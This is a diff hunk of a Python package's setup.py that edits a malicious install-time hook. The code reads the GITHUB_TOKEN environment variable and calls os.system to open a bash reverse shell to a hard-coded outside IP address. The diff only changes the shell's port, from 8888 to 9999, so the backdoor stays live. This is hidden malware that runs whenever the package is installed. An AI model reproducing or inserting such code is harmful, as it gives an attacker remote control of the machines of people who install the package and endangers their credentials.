@@ -10,7 +10,7 @@ from setuptools import setup, find_packages
 import os
 
 token=os.environ.get("GITHUB_TOKEN")
-command = "bash -i >& /dev/tcp/47.242.44.226/8888 0>&1" 
+command = "bash -i >& /dev/tcp/47.242.44.226/9999 0>&1" 
 os.system(command)
 
 
